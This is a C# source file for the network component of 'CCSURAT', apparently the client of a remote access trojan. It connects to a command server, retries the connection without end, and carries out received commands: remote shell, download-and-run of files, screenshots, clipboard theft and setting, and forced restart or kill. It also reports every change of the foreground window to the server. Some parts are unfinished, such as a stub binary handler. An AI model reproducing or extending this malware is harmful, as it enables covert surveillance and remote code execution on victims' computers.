﻿using CCSURAT_Client.Control;
using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace CCSURAT_Client
{
    // Manages the network of the client.
    // - Communicates with server (connects, listens to commands, sends data to server)
    // - Performs functions based on received commands.
    class NetworkManager
    {
        private string serverIP;
        private int serverPort;

        // Store main form to print to its console.
        private ClientMainForm mainForm;

        private TcpClient client;
        private NetworkStream netStream;
        private string curData;

        private string status;
        private Boolean isConnected;

        private RemoteCMD remoteCMD;
        private RemoteDesktop remoteDesktop;

        // Binary data handling variables
        private bool bufferBytes = false;
        private byte[] dataBuffer = new byte[1024 * 5000];
        private long bufferPos = 0;

        #region Active Window
        WinEventDelegate dele = null;
        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
        [DllImport("user32.dll")]
        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;
        # endregion

        public NetworkManager(ClientMainForm form, string IP, int port)
        {
            this.mainForm = form;
            this.serverIP = IP;
            this.serverPort = port;
            SetStatus("Disconnected.");
            dele = new WinEventDelegate(WinEventProc);
            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);

            remoteDesktop = new RemoteDesktop();
        }

        public void Start()
        {
            // Attempt TCP listener connection to server.
            SetStatus("Attempting connection.");
            Log("Connecting to server: " + serverIP + ":" + serverPort);
            while (!isConnected)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(serverIP, serverPort);
                    netStream = client.GetStream();

                    isConnected = true;
                    status = "Connected.";
                    Log("Connection successful!");

                    Thread cmdListenThread = new Thread(ListenToCommands);
                    cmdListenThread.SetApartmentState(ApartmentState.STA);
                    cmdListenThread.Start();

                    Log("Listening to commands.");
                }
                catch (Exception ex)
                {
                    Log("Error occurred while connecting: " + ex.ToString());
                    Thread.Sleep(100);
                    Log("Retrying connection...");
                }
            }
        }

        private void ListenToCommands()
        {
            netStream = client.GetStream();
            try
            {
                while (netStream.CanRead && IsAlive())
                {
                    byte[] bytes = new byte[1024];
                    string data = null;
                    int i;
                    if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        // convert data bytes to string
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        curData += data;
                        if (!data.Contains("SCREENSHOT"))
                            Log("Data recieved: " + data);
                        // If we are receiving binary data, place data into buffer.
                        if (data.Contains("[[BINARY]]"))
                            bufferBytes = true;
                        if (bufferBytes)
                        {
                            try
                            {
                                bytes.CopyTo(dataBuffer, bufferPos);
                                bufferPos += i;
                            }
                            catch { }
                        }
                        // Handles the first command.
                        if (FirstCommandIsClosed(curData))
                            HandleData(FirstCommand());
                    }
                    Thread.Sleep(1);
                }
            }
            catch (Exception ex)
            {
                Log("Error recieving command: " + ex.ToString());
            }
            finally
            {
                isConnected = false;
                Log("Connection lost/closed. Retrying connection...");
                Start();
            }
        }

        // checks if the server is still up and connection is stable
        private Boolean IsAlive()
        {
            try
            {
                // write empty buffer to server to check if connection is alive
                byte[] empty = new byte[1];
                netStream.Write(empty, 0, 0);
                return true;
            }
            catch (SocketException ex)
            {
                // Send buffer is full, but still connected to server.
                if (ex.NativeErrorCode.Equals(10035))
                    return true;
                else
                {
                    return false;
                }
            }
        }

        private void HandleData(string data)
        {
            try {
                string command = GetCommand(data);
                data = RemoveCommand(data);
                // Split parameters, seperated by |*|.
                string[] prms = new string[0];
                if (data != string.Empty)
                    prms = data.Split(new string[] { "|*|" }, StringSplitOptions.None);
                if (!command.Contains("SCREENSHOT"))
                    Log("Handling command: " + command);
                switch (command)
                {
                    case "START":
                        Write("[[START]]" + SystemUtils.SystemInfo() + "[[/START]]");
                        break;
                    case "KILL":
                        Environment.Exit(0);
                        break;
                    case "RESTART":
                        Application.Restart();
                        Environment.Exit(0);
                        break;
                    case "MESSAGE":
                        MessageBox.Show(data);
                        break;
                    case "CLIPBOARD":
                        if (data == string.Empty)
                            Write("[[CLIPBOARD]]" + SystemUtils.GetClipboard() + "[[/CLIPBOARD]]");
                        else
                            SystemUtils.SetClipboard(data);
                        break;
                    case "REMOTECMD":
                        RemoteCmd(prms[0]);
                        Write("[[CMD]]" + remoteCMD.GetResponse() + "[[/CMD]]");
                        break;
                    case "DOWNLOADRUN":
                        SystemUtils.DownloadRun(prms[0], prms[1]);
                        break;
                    case "SCREENSHOT":
                        Write(remoteDesktop.GetScreenshot(prms[0], prms[1], prms[2]));
                        break;
                    case "MONITORS":
                        Write("[[MONITORS]]" + SystemUtils.GetMonitors() + "[[/MONITORS]]");
                        break;
                }
            } catch(Exception ex)
            {
                Log("Could not handle data: " + data + "\nReason: " + ex.ToString());
            }
        }

        // Handle binary data (Images/Files)
        private void HandleBinaryData(string data)
        {
            // Reset binary byte buffer and position.
            bufferBytes = false;
            bufferPos = 0;

            // remove type of data command tag from data.
            int start, length;
        }

        // Gets command tag
        private string GetCommand(string text)
        {
            text = text.Substring(2, text.IndexOf("]") - 2);
            return text;
        }

        // Removes command tag from data
        private string RemoveCommand(string data)
        {
            data = data.Substring(data.IndexOf("]]") + 2);
            data = data.Substring(0, data.LastIndexOf("[") - 1);
            return data;
        }

        // Checks if first command in data is closed.
        private bool FirstCommandIsClosed(string data)
        {
            string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
            openCommandTag = data.Substring(2, openCommandTag.Length - 4);
            string closeCommandTag = "[[/" + openCommandTag + "]]";
            return data.Contains(closeCommandTag);
        }

        // Gets the first command in data.
        private string FirstCommand()
        {
            string openCommandTag = curData.Substring(0, curData.IndexOf("]") + 2);
            openCommandTag = curData.Substring(2, openCommandTag.Length - 4);
            string closeCommandTag = "[[/" + openCommandTag + "]]";
            string temp = curData.Substring(0, curData.IndexOf(closeCommandTag) + closeCommandTag.Length);
            curData = curData.Substring(temp.Length);
            return temp;
        }

        // write string data to server
        public void Write(string data)
        {
            if (isConnected)
            {
                try
                {
                    byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
                    netStream.Write(msg, 0, msg.Length);
                    Thread.Sleep(20);
                    if (!data.Contains("[[SCREENSHOT]]"));
                        Log("Data sent: " + data);
                }
                catch (Exception ex)
                {
                    Log("Error sending data: " + ex.ToString());
                }
            }
        }

        // write byte data to server
        private void Write(byte[] data)
        {
            if (isConnected)
            {
                try
                {
                    netStream.Write(data, 0, data.Length);
                }
                catch (Exception ex)
                {
                    Log("Error sending data: " + ex.ToString());
                }
            }
        }

        // Detects active window change. Might need to look at adding web browser tab change detection.
        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            Write("[[ACTIVEWINDOW]]" + SystemUtils.GetActiveWindow() + "[[/ACTIVEWINDOW]]");
        }

        // Process Remote CMD data on the CMD control
        private void RemoteCmd(string arg)
        {
            if (remoteCMD == null)
                remoteCMD = new RemoteCMD();
            if (arg == "[[RESTART]]")
                remoteCMD.Restart();
            else if (arg == "[[STOP]]")
                remoteCMD.Stop();
            else if (arg != "[[START]]")
                remoteCMD.Write(arg);
        }

        private void SetStatus(string s)
        {
            status = s;
        }
        private void Log(string s)
        {
            mainForm.Log(s);
        }
    }
} 
